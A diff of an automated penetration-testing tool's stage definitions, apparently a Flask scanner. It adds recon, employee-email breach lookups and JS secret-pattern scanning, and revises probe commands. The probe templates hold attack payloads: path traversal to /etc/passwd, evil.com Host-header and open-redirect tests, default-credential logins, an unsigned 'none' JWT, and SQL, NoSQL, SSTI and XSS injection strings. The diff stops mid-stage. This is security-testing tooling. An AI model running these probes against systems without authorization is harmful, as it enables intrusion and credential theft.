@@ -5,7 +5,7 @@ verified findings, fixed PDF report with PoC + code-fix examples,
 enriched popup data (path, command, remediation).
 """
 
-import os, re, uuid, json, time, queue, threading, subprocess, shutil, html, socket, signal, ipaddress, select
+import os, re, uuid, json, time, queue, threading, subprocess, shutil, html, socket, signal, ipaddress, select, urllib.request, urllib.parse, math as _math, inspect
 from datetime import datetime
 from flask import Flask, request, Response, jsonify, send_file
 from reportlab.lib.pagesizes import A4
@@ -99,6 +99,76 @@ CHAIN = [
                 "fallback_cmd": "curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|via|x-powered|x-cache'",
                 "parse": "waf",
             },
+            {
+                "id": "recon_subdomains", "label": "Subdomain Enumeration", "tool": "dnsrecon / crt.sh / dig",
+                "description": "Passive subdomain gathering (ct logs, search engines) plus a brute-force pass, then validating which candidates actually resolve to A records. The parser only reports subdomains that resolved.",
+                "cmd_template": "echo '=CRT.SH='; case {target} in *[a-zA-Z]*) curl -s --max-time 12 'https://crt.sh/?q=%25.{target}&output=json' 2>/dev/null | python3 -c \"import json,sys\ntry:\n d=json.load(sys.stdin)[:80]\nexcept Exception:\n d=[]\nfor x in d:\n print(x.get('name_value',''))\" 2>/dev/null || echo '[crt.sh unavailable]';; *) echo '[crt.sh skipped — IP target]';; esac; echo '=DNSRECON='; if command -v dnsrecon >/dev/null 2>&1; then timeout -k 5 90 dnsrecon -d {target} -t std,brt -D /usr/share/wordlists/dnsrecon/top-level-names.txt 2>&1 | grep -iE 'A |CNAME|NS |SOA ' | head -50; else echo '[dnsrecon not installed]'; fi; echo '=RESOLVED SUBS='; for s in www api dev admin mail vpn portal staging app test beta m login dashboard; do ip=$(dig +short $s.{target} A 2>/dev/null | head -1); if [ -n \"$ip\" ]; then echo \"$s.{target} -> $ip\"; fi; done",
+                "fallback_cmd": "echo '=RESOLVED SUBS='; for s in www api dev admin mail; do ip=$(dig +short $s.{target} A 2>/dev/null | head -1); [ -n \"$ip\" ] && echo \"$s.{target} -> $ip\"; done",
+                "parse": "subdomains",
+            },
+            {
+                "id": "recon_osint_passive", "label": "Passive OSINT", "tool": "whois / RIPE / geoip",
+                "description": "Registration data, ASN/organisation, routing visibility and geolocation context for the target. Information-only — never a vulnerability claim on its own.",
+                "cmd_template": "echo '=WHOIS='; timeout -k 5 30 whois {target} 2>&1 | grep -iE 'registrant|org-name|organization|netname|descr|country|abuse-c|created:|expires:' | head -20; echo '=ROUTING PREFIX='; timeout -k 5 20 python3 -c \"import json,urllib.request\ntry:\n d=json.load(urllib.request.urlopen('https://stat.ripe.net/data/prefix/data.json?resource={target}',timeout=6))\n p=(d.get('data',{}) or {}).get('prefixes')\n print('prefix:', p[0].get('prefix') if p else 'none')\nexcept Exception:\n print('prefix: unknown')\"; echo '=GEOIP='; timeout -k 5 15 python3 -c \"import json,urllib.request\ntry:\n d=json.load(urllib.request.urlopen('https://ipwho.is/{target}',timeout=6))\n print('country:',d.get('country'))\n print('org:',d.get('connection',{}).get('org'))\nexcept Exception:\n print('geoip: unavailable')\"",
+                "fallback_cmd": "timeout -k 5 30 whois {target} 2>&1 | grep -iE 'org-name|netname|descr|country' | head -15",
+                "parse": "generic",
+            },
+            {
+                "id": "recon_breach_osint", "label": "Employee / Email Breach OSINT", "tool": "theHarvester / HIBP",
+                "description": "Harvests employee emails via theHarvester (written to {outdir}/theharvester_emails.txt). If PWM_HIBP_KEY is set, each unique address is checked against Have I Been Pwned; a COMPROMISED finding is only emitted for a real 200 breach response.",
+                "cmd_template": "mkdir -p {outdir}/osint; if command -v theHarvester >/dev/null 2>&1; then timeout -k 5 120 theHarvester -d {target} -b baidu,bing,dnsdumpster,crtsh,hackertarget -l 300 2>&1 | tee {outdir}/theharvester_emails.txt | sed -n '/Emails found/,$p' | grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+' | sort -u | head -40; else echo '[theHarvester not installed]'; fi; echo '=HIBP CHECK='; if [ -n \"$PWM_HIBP_KEY\" ]; then python3 -c \"import os,re,urllib.request,urllib.error,json\nkey=os.environ.get('PWM_HIBP_KEY'); em=[]\ntry:\n for line in open('{outdir}/theharvester_emails.txt',errors='ignore'):\n  em += re.findall(r'[a-z0-9._%+-]+@[a-z0-9.-]+',line)\nexcept Exception:\n pass\nfor e in list(dict.fromkeys(em))[:15]:\n try:\n  req=urllib.request.Request('https://haveibeenpwned.com/api/v3/breachedaccount/'+e,headers={'hibp-api-key':key,'user-agent':'pwm-osint'})\n  r=urllib.request.urlopen(req,timeout=10)\n  d=json.load(r)\n  if isinstance(d,list) and d: print('COMPROMISED:'+e+'|'+','.join((x.get('Name') or '') for x in d[:5]))\n  else: print('NO_BREACH:'+e)\n except urllib.error.HTTPError as he:\n  if he.code==404: print('NO_BREACH:'+e)\n  else: print('HIBP_ERROR:'+e+'|http_'+str(he.code))\n except Exception as ex:\n  print('HIBP_ERROR:'+e+'|'+str(ex)[:60])\n\"; else echo '[PWM_HIBP_KEY not set — breach lookup skipped; discovery only]'; fi",
+                "fallback_cmd": "echo '[theHarvester not available — no email OSINT run]'",
+                "parse": "breach_osint",
+            },
+            {
+                "id": "recon_js_leak", "label": "JS / Endpoint Leakage", "tool": "python / curl",
+                "description": "Crawls script references on the app, downloads each JS bundle, and extracts API endpoints. Emits a high finding ONLY when a real secret pattern (AWS/stripe/GitHub/GCP/slack/JWT/private key/password) is present in bundle content.",
+                "cmd_template": "python3 - <<'PY'\nimport urllib.request,re\nhtml=''\nfor page in ('/', '/spa'):\n    try:\n        html+=urllib.request.urlopen('http://{target}'+page,timeout=8).read().decode('utf-8','ignore')\n    except Exception:\n        pass\nscripts=re.findall(r'''<script[^>]+src=[\"']([^\"']+)[\"']''',html)\nscripts=[s for s in scripts if s.endswith('.js')][:12]\njs=''\nfor s in scripts:\n    u2=s if s.startswith('http') else ('http://{target}'+s if s.startswith('/') else 'http://{target}/'+s)\n    try:\n        js+=urllib.request.urlopen(u2,timeout=6).read().decode('utf-8','ignore')+'\\n'\n    except Exception:\n        pass\nprint('=====JS-SRC-LIST=====')\nfor s in scripts: print(s)\nprint('=====JS-ENDPOINTS=====')\npat=r'''[\"']((?:/|https?://)[A-Za-z0-9_\\-\\./]*(?:/api/|/v1/|/v2/|/graphql|/rest|/wp-json|/upload|/download|/assets)[A-Za-z0-9_\\-\\./]*)[\"']'''\nfor m in sorted(set(re.findall(pat,js)))[:40]: print(m)\nprint('=====JS-SECRETS=====')\npats=[(r'sk_[A-Za-z0-9_]{20,}','stripe'),(r'AKIA[0-9A-Z]{16}','aws'),(r'ghp_[A-Za-z0-9]{30,}','github'),(r'AIza[0-9A-Za-z_-]{30,}','gcp'),(r'xox[baprs]-[A-Za-z0-9-]{10,}','slack'),(r'(eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.)[A-Za-z0-9_-]{10,}','jwt'),(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----','private_key'),(r'password\\?\\s*[:=]\\s*[\"\\']([^\"\\']{6,})[\"\\']','password')]\nfor pat,name in pats:\n    for m in list(set(re.findall(pat,js)))[:5]:\n        v=m if isinstance(m,str) else (m[-1] if m[-1] else m[0])\n        print('SECRET:'+name+':'+(v[:70] if v else ''))\nprint('=====SOURCEMAP=====')\nfor s in scripts[:8]:\n    u2=s if s.startswith('http') else ('http://{target}'+s if s.startswith('/') else 'http://{target}/'+s)\n    try:\n        b=urllib.request.urlopen(u2+'.map',timeout=6).read()\n        if b[:1]==b'{': print('MAP:'+u2+'.map')\n    except Exception:\n        pass\nPY",
+                "fallback_cmd": "echo 'JS_SCAN_ERROR: no python3 urllib available'",
+                "parse": "js_leak",
+            },
+            {
+                "id": "recon_version_cve", "label": "Service Version → NVD CVE Cross-Reference", "tool": "nmap -sV / NVD API",
+                "description": "Re-runs light version detection, then each service/version pair is looked up as an exact CPE against the NVD cpeName API (verified vectors only, never keyword guesses). CVE findings carry the real NVD vector.",
+                "cmd_template": "nmap -sV --version-light --max-retries 1 -p {ports} -T4 -oN {outdir}/nmap_versions.txt {target} 2>&1 | grep -iE '^[0-9]+/tcp.*open' | head -40",
+                "fallback_cmd": "echo 'NO_NMAP'",
+                "parse": "version_cve",
+            },
+            {
+                "id": "recon_tech", "label": "Web Stack / Technology Fingerprint", "tool": "whatweb / nuclei",
+                "description": "Fingerprint the web stack — server, CMS, framework, libraries — via whatweb level-3 and the nuclei technologies template set. Emits informational technology findings only.",
+                "cmd_template": "echo '=WHATWEB='; if command -v whatweb >/dev/null 2>&1; then timeout -k 5 60 whatweb -a 3 http://{target} 2>&1 | head -30; else echo '[whatweb not installed]'; fi; echo '=NUCLEI TECHNOLOGIES='; if command -v nuclei >/dev/null 2>&1; then timeout -k 5 120 nuclei -u http://{target} -t /home/spidersecops/.local/nuclei-templates/http/technologies -silent 2>&1 | head -60; else echo '[nuclei not installed]'; fi",
+                "fallback_cmd": "curl -skIL --max-time 8 http://{target} 2>&1 | head -30",
+                "parse": "tech",
+            },
+            {
+                "id": "recon_nuclei", "label": "Nuclei Exposure & Misconfig Recon", "tool": "nuclei",
+                "description": "Scan against exposures, misconfiguration, exposed-panels and token-spray templates only — recon-grade detection feeding later verification.",
+                "cmd_template": "if command -v nuclei >/dev/null 2>&1; then timeout -k 5 180 nuclei -u http://{target} -t /home/spidersecops/.local/nuclei-templates/http/exposures -t /home/spidersecops/.local/nuclei-templates/http/misconfiguration -t /home/spidersecops/.local/nuclei-templates/http/exposed-panels -t /home/spidersecops/.local/nuclei-templates/http/token-spray -severity critical,high,medium -silent -o {outdir}/nuclei_recon.txt 2>&1 | head -80; else echo '[nuclei not installed]'; fi",
+                "fallback_cmd": "echo '[nuclei not installed]'",
+                "parse": "nuclei",
+            },
+            {
+                "id": "recon_content", "label": "Content Discovery", "tool": "ffuf / gobuster",
+                "description": "Directory/file discovery with ffuf and gobuster wordlists. Findings are informational paths — never vulnerabilities by status alone. 3xx statuses are explicitly ignored for vuln claims.",
+                "cmd_template": "echo '=GOBUSTER='; if command -v gobuster >/dev/null 2>&1; then gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 40 -q --no-error -x php,txt,bak,bak2,sql,zip,tar.gz,conf,xml,json,log,env -o {outdir}/gobuster_recon.txt 2>&1 | head -80; else echo '[gobuster not installed]'; fi; echo '=FFUF='; if command -v ffuf >/dev/null 2>&1; then ffuf -u 'http://{target}/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc 200,201,202,204,301,302,307,308,401,403 -fc 404 -t 40 2>&1 | grep -viE 'INFO|WARNING' | head -60; else echo '[ffuf not installed]'; fi",
+                "fallback_cmd": "echo '[content discovery tools not available]'",
+                "parse": "dirb",
+            },
+            {
+                "id": "recon_ad_enum", "label": "Active Directory Enumeration", "tool": "ldapsearch / nmap NSE",
+                "description": "Attempts an anonymous LDAP base query and common default naming contexts, plus nmap NSE for LDAP/Kerberos/SMB. Anything reported is gated on the service actually responding with directory data.",
+                "cmd_template": "echo '=LDAP BASE='; if command -v ldapsearch >/dev/null 2>&1; then timeout -k 5 20 ldapsearch -x -H ldap://{target} -s base namingContexts 2>&1 | head -15 || echo '[ldap bind failed]'; else echo '[ldapsearch not installed]'; fi; echo '=DEFAULT CONTEXTS='; if command -v ldapsearch >/dev/null 2>&1; then for dc in 'DC=corp,DC=local' 'DC=ad,DC=corp,DC=local' 'DC=domain,DC=local'; do timeout -k 3 8 ldapsearch -x -H ldap://{target} -b \"$dc\" -s base dn 2>&1 | head -4; done; fi; echo '=NSE LDAP='; timeout -k 5 40 nmap --script=ldap-rootdse,ldap-search,ldap-anonymous -p 389,636,88,3268,3269 {target} 2>&1 | head -40",
+                "fallback_cmd": "echo '[ad enum unavailable]'",
+                "parse": "ad_enum",
+            },
+            {
+                "id": "recon_cloud", "label": "Cloud / CDN Misconfig Baseline", "tool": "curl / python",
+                "description": "Provider and CDN header fingerprinting plus cloud well-known endpoint checks. Emits informational provider findings from real header evidence only.",
+                "cmd_template": "echo '=PROVIDER HEADERS (HTTP)='; curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-goog-|via|x-sucuri|x-cld-|cf-ray|x-host' | head -12; echo '=PROVIDER HEADERS (HTTPS)='; curl -skI --max-time 8 https://{target} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-cf-|via|cf-ray' | head -8; echo '=CLOUD WELL-KNOWN='; for u in .well-known/openid-configuration .well-known/security.txt robots.txt; do code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 4 'http://{target}/'$u); echo \"$u -> $code\"; done",
+                "fallback_cmd": "curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|x-amz-|cf-ray|via' | head -8",
+                "parse": "cloud",
+            },
         ],
     },
     {
@@ -157,6 +227,18 @@ CHAIN = [
                 "cmd_template": "echo '---SMTP---'; nmap --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25,465,587 {target} 2>&1 | head -40; echo '---LDAP---'; nmap --script=ldap-rootdse,ldap-search,ldap-brute -p 389,636 {target} 2>&1 | head -30; echo '---FTP---'; nmap --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 {target} 2>&1 | head -30",
                 "parse": "nse_deep",
             },
+            {
+                "id": "vuln_evidence", "label": "Evidence Capture — Screenshot / PCAP", "tool": "chromium / tcpdump",
+                "description": "For every scorable finding (critical/high/medium with a reachable http endpoint), a headless-chrome screenshot and a tcpdump PCAP of a short re-probe are captured into {outdir}/evidence. Evidence is attached to the finding; captures that fail are reported, not fabricated.",
+                "cmd_template": "echo 'evidence capture substage (in-process)'",
+                "parse": "evidence",
+            },
+            {
+                "id": "vuln_assess", "label": "CVSS Scoring & False-Positive Triage", "tool": "in-process",
+                "description": "Computes a CVSS v3.1 vector + base score for every finding, assigns an automated triage verdict (confirmed / tool-confirmed / needs_review / info), records the log, and prints a reviewable assessment. Analyst overrides land via POST /api/session/<sid>/triage.",
+                "cmd_template": "echo 'assessment substage (in-process)'",
+                "parse": "assess",
+            },
         ],
     },
     {
@@ -178,7 +260,7 @@ CHAIN = [
             {
                 "id": "deep_http_anomaly", "label": "HTTP Behaviour Anomaly", "tool": "curl probes",
                 "description": "Path traversal, verb tampering, host header injection, sensitive file exposure.",
-                "cmd_template": "echo '---TRAVERSAL---'; curl -sk 'http://{target}/../../../../etc/passwd' -o - 2>&1 | head -5; echo '---VERB TAMPER---'; curl -skI -X TRACE 'http://{target}/' 2>&1 | head -10; echo '---HOST INJECT---'; curl -skI -H 'Host: evil.com' 'http://{target}/' 2>&1 | head -8; echo '---OPTIONS---'; curl -skI -X OPTIONS 'http://{target}/' 2>&1 | head -8; echo '---ADMIN---'; curl -sk 'http://{target}/admin' -o /dev/null -w 'admin: %{http_code}\\n' 2>&1; curl -sk 'http://{target}/.git/config' -o /dev/null -w '.git: %{http_code}\\n' 2>&1; curl -sk 'http://{target}/.env' -o /dev/null -w '.env: %{http_code}\\n' 2>&1",
+                "cmd_template": "echo '---TRAVERSAL---'; curl -sk --max-time 8 'http://{target}/../../../../etc/passwd' -o - 2>&1 | head -5; echo '---VERB TAMPER---'; curl -skI -X TRACE 'http://{target}/' 2>&1 | head -10; echo '---HOST INJECT---'; curl -skI -H 'Host: evil.com' 'http://{target}/' 2>&1 | head -8; echo '---OPTIONS---'; curl -skI -X OPTIONS 'http://{target}/' 2>&1 | head -8; echo '---ADMIN---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/admin' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/admin' 2>/dev/null); echo \"body:admin[$code] $body\"; echo '---GIT---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/.git/config' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/.git/config' 2>/dev/null); echo \"body:.git[$code] $body\"; echo '---ENV---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/.env' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/.env' 2>/dev/null); echo \"body:.env[$code] $body\"",
                 "parse": "http_anomaly",
             },
             {
@@ -190,7 +272,7 @@ CHAIN = [
             {
                 "id": "deep_auth_probe", "label": "Auth & Session Weaknesses", "tool": "curl probes",
                 "description": "Session fixation, token flags, default credentials on SSH/FTP/HTTP.",
-                "cmd_template": "echo '---SESSION HEADERS---'; curl -skI 'http://{target}/login' 2>&1 | grep -iE 'set-cookie|www-auth|x-frame|x-xss|strict-transport|content-security' | head -15; echo '---BASIC AUTH PROBE---'; curl -sku admin:admin -o /dev/null -w 'admin:admin=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku admin:password -o /dev/null -w 'admin:password=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku root:root -o /dev/null -w 'root:root=%{http_code}\\n' 'http://{target}/' 2>&1; echo '---FTP ANON---'; curl -s ftp://{target}/ 2>&1 | head -10; echo '---SSH VERSION---'; nc {target} 22 2>&1 | head -3",
+                "cmd_template": "echo '---SESSION HEADERS---'; curl -skI --max-time 8 'http://{target}/login' 2>&1 | grep -iE 'set-cookie|www-auth|x-frame|x-xss|strict-transport|content-security' | head -15; echo '---BASIC AUTH PROBE---'; anon=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/' 2>/dev/null); echo \"anon=$anon\"; curl -sku admin:admin --max-time 8 -o /dev/null -w 'admin:admin=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku admin:password --max-time 8 -o /dev/null -w 'admin:password=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku root:root --max-time 8 -o /dev/null -w 'root:root=%{http_code}\\n' 'http://{target}/' 2>&1; echo '---FTP ANON---'; curl -s --max-time 8 ftp://{target}/ 2>&1 | head -10; echo '---SSH VERSION---'; nc -w 4 {target} 22 2>&1 | head -3",
                 "parse": "auth_probe",
             },
             {
@@ -201,15 +283,15 @@ CHAIN = [
             },{
                 "id": "deep_xss_probe", "label": "XSS & Injection Surface Probe", "tool": "dalfox / curl",
                 "description": "Reflected XSS, open redirect, XXE, SSTI and DOM injection probes across common parameters.",
-                "cmd_template": "echo '---XSS REFLECT---'; for p in q search id name input; do code=$(curl -sk -o /dev/null -w '%{http_code}' http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null); body=$(curl -sk http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null | grep -oi 'onerror\\|alert' | head -1); echo $p' XSS '${code}': '$body; done; echo '---OPEN REDIRECT---'; for p in next redirect url return dest; do r=$(curl -skI http://{target}/?$p=https://evil.com 2>/dev/null | grep -i 'location.*evil' | head -1); echo $p': '$r; done; echo '---XXE PROBE---'; curl -sk -X POST -H 'Content-Type: application/xml' --data-binary '<root></root>' http://{target}/ -o - 2>&1 | grep -iE 'root:|xxe|entity' | head -3; echo '---SSTI PROBE---'; curl -sk http://{target}/?name=%7B%7B7*7%7D%7D -o - 2>&1 | grep -o '49' | head -2; echo '---DALFOX---'; if command -v dalfox >/dev/null 2>&1; then dalfox url http://{target}/ --silence --no-spinner 2>&1 | head -20; else echo '[dalfox not installed — skipped]'; fi",
+                "cmd_template": "echo '---XSS REFLECT---'; for p in q search id name input; do code=$(curl -skL -o /dev/null -w '%{http_code}' http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null); body=$(curl -skL http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null | grep -oi 'onerror\\|alert' | head -1); echo $p' XSS '${code}': '$body; done; echo '---OPEN REDIRECT---'; for p in next redirect url return dest; do r=$(curl -skI http://{target}/?$p=https://evil.com 2>/dev/null | grep -i 'location.*evil' | head -1); echo $p': '$r; done; echo '---XXE PROBE---'; curl -sk -X POST -H 'Content-Type: application/xml' --data-binary '<root></root>' http://{target}/ -o - 2>&1 | grep -iE 'root:|xxe|entity' | head -3; echo '---SSTI PROBE---'; curl -sk http://{target}/?name=%7B%7B7*7%7D%7D -o - 2>&1 | grep -o '49' | head -2; echo '---DALFOX---'; if command -v dalfox >/dev/null 2>&1; then dalfox url http://{target}/ --silence --no-spinner 2>&1 | head -20; else echo '[dalfox not installed — skipped]'; fi",
                 "fallback_cmd": "echo '---XSS CHECK---'; for p in q search id; do curl -sk http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E -o - 2>&1 | grep -oi 'alert' | head -1; done",
                 "parse": "xss_probe",
             },
             {
                 "id": "deep_cms_scan", "label": "CMS & Framework Detection", "tool": "wpscan / droopescan",
                 "description": "Detect WordPress, Drupal, Joomla, Laravel, Django, Rails installs. Enumerate plugins, themes, users.",
-                "cmd_template": "echo '---WP DETECT---'; curl -sk http://{target}/wp-login.php -o /dev/null -w 'wp-login: %{http_code}\n' 2>&1; curl -sk http://{target}/wp-json/wp/v2/users -o - 2>&1 | head -5; echo '---WPSCAN---'; wpscan --url http://{target} --enumerate vp,u,m --no-update 2>&1 | head -60; echo '---DRUPAL---'; curl -sk http://{target}/CHANGELOG.txt -o - 2>&1 | head -5; curl -sk http://{target}/user/login -o /dev/null -w 'drupal_login: %{http_code}\n' 2>&1; echo '---JOOMLA---'; curl -sk http://{target}/administrator/ -o /dev/null -w 'joomla_admin: %{http_code}\n' 2>&1",
-                "fallback_cmd": "curl -sk http://{target}/wp-login.php -o /dev/null -w 'wp-login: %{http_code}\n' 2>&1; curl -sk http://{target}/CHANGELOG.txt -o - 2>&1 | head -5",
+                "cmd_template": "echo '---WP DETECT---'; wb=$(curl -sk --max-time 8 'http://{target}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 'http://{target}/wp-json/wp/v2/users' -o - 2>&1 | head -5; echo '---WPSCAN---'; wpscan --url http://{target} --enumerate vp,u,m --no-update 2>&1 | head -60; echo '---DRUPAL---'; curl -sk --max-time 8 'http://{target}/CHANGELOG.txt' -o - 2>&1 | head -5; db=$(curl -sk --max-time 8 'http://{target}/user/login' 2>/dev/null | tr '\\n' ' ' | head -c 200); dc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/user/login' 2>/dev/null); echo \"drupal_login:$dc|$db\"; echo '---JOOMLA---'; jb=$(curl -sk --max-time 8 'http://{target}/administrator/' 2>/dev/null | tr '\\n' ' ' | head -c 200); jc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/administrator/' 2>/dev/null); echo \"joomla_admin:$jc|$jb\"",
+                "fallback_cmd": "wb=$(curl -sk --max-time 8 'http://{target}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 'http://{target}/CHANGELOG.txt' -o - 2>&1 | head -5",
                 "parse": "cms_scan",
             },
         ],
@@ -221,7 +303,7 @@ CHAIN = [
             {
                 "id": "api_discovery", "label": "API Endpoint Discovery", "tool": "curl / gobuster",
                 "description": "Discover REST/GraphQL endpoints, API versioning, swagger/openapi docs, and common API paths.",
-                "cmd_template": "echo '---API PATHS---'; for path in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /graphql /swagger /swagger-ui /swagger.json /openapi.json /api-docs /rest /ws /wsdl /.well-known /health /metrics /actuator /actuator/env /actuator/mappings; do code=$(curl -sk -o /dev/null -w '%{http_code}' http://{target}$path 2>/dev/null); echo \"$path: $code\"; done; echo '---GRAPHQL INTROSPECT---'; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' http://{target}/graphql 2>&1 | head -20",
+                "cmd_template": "echo '---API PATHS---'; for p in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /graphql /swagger /swagger-ui /swagger.json /openapi.json /api-docs /rest /ws /wsdl /.well-known /health /metrics /actuator /actuator/env /actuator/mappings; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_apid_$$ 'http://{target}'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_apid_$$ 2>/dev/null | head -c 180); rm -f /tmp/pwm_apid_$$; echo \"$p:$out|$body\"; done; echo '---GRAPHQL INTROSPECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' http://{target}/graphql 2>&1 | head -20",
                 "parse": "api_discovery",
             },
             {
@@ -233,31 +315,31 @@ CHAIN = [
             {
                 "id": "api_auth", "label": "Broken Authentication Probe", "tool": "curl probes",
                 "description": "Test JWT weaknesses, missing auth on endpoints, token reuse, and brute-force protection.",
-                "cmd_template": "echo '---NO AUTH---'; curl -sk 'http://{target}/api/v1/admin' -o /dev/null -w 'admin: %{http_code}\\n' 2>&1; curl -sk 'http://{target}/api/v1/users' -o /dev/null -w 'users: %{http_code}\\n' 2>&1; curl -sk 'http://{target}/api/v1/config' -o /dev/null -w 'config: %{http_code}\\n' 2>&1; echo '---JWT NONE ALG---'; curl -sk -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' 'http://{target}/api/v1/admin' -o /dev/null -w 'jwt_none: %{http_code}\\n' 2>&1; echo '---NULL TOKEN---'; curl -sk -H 'Authorization: Bearer null' 'http://{target}/api/v1/users' -o /dev/null -w 'null_token: %{http_code}\\n' 2>&1; echo '---NO TOKEN---'; curl -sk 'http://{target}/api/v1/profile' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---NO AUTH---'; anon=$(curl -sk --max-time 8 'http://{target}/api/v1/admin' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"anon:$anon|\"; curl -sk --max-time 8 'http://{target}/api/v1/users' -o /dev/null -w 'users: %{http_code}\\n' 2>/dev/null; curl -sk --max-time 8 'http://{target}/api/v1/config' -o /dev/null -w 'config: %{http_code}\\n' 2>/dev/null; echo '---JWT NONE ALG---'; curl -sk --max-time 8 -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' 'http://{target}/api/v1/admin' -o /dev/null -w 'jwt_none: %{http_code}\\n' 2>/dev/null; echo '---NULL TOKEN---'; curl -sk --max-time 8 -H 'Authorization: Bearer null' 'http://{target}/api/v1/users' -o /dev/null -w 'null_token: %{http_code}\\n' 2>/dev/null; echo '---NO TOKEN---'; curl -sk --max-time 8 'http://{target}/api/v1/profile' -o - 2>&1 | head -5",
                 "parse": "api_auth",
             },
             {
                 "id": "api_injection", "label": "API Injection Testing", "tool": "curl probes",
                 "description": "SQL injection, NoSQL injection, command injection and SSTI via API parameters.",
-                "cmd_template": "echo '---SQL INJECT---'; curl -sk 'http://{target}/api/v1/users?id=1%27' -o - 2>&1 | head -8; curl -sk 'http://{target}/api/v1/search?q=test%27+OR+1%3D1--' -o - 2>&1 | head -8; echo '---NOSQL INJECT---'; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}' 'http://{target}/api/login' 2>&1 | head -8; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}' 'http://{target}/api/v1/login' 2>&1 | head -8; echo '---SSTI PROBE---'; curl -sk 'http://{target}/api/v1/search?q={{7*7}}' -o - 2>&1 | head -5; curl -sk 'http://{target}/api/v1/render?template={{7*7}}' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---SQL INJECT---'; curl -sk --max-time 8 'http://{target}/api/v1/users?id=1%27' -o - 2>&1 | head -8; curl -sk --max-time 8 'http://{target}/api/v1/search?q=test%27+OR+1%3D1--' -o - 2>&1 | head -8; echo '---NOSQL INJECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}' 'http://{target}/api/login' 2>&1 | head -8; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}' 'http://{target}/api/v1/login' 2>&1 | head -8; echo '---SSTI PROBE---'; echo \"SSTI_RESULT:$(curl -sk --max-time 8 'http://{target}/api/v1/search?q={{7*7}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"; echo \"SSTI_RESULT:$(curl -sk --max-time 8 'http://{target}/api/v1/render?template={{7*7}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"",
                 "parse": "api_injection",
             },
             {
                 "id": "api_ssrf", "label": "SSRF Detection", "tool": "curl probes",
                 "description": "Server-Side Request Forgery — test URL parameters for internal service access.",
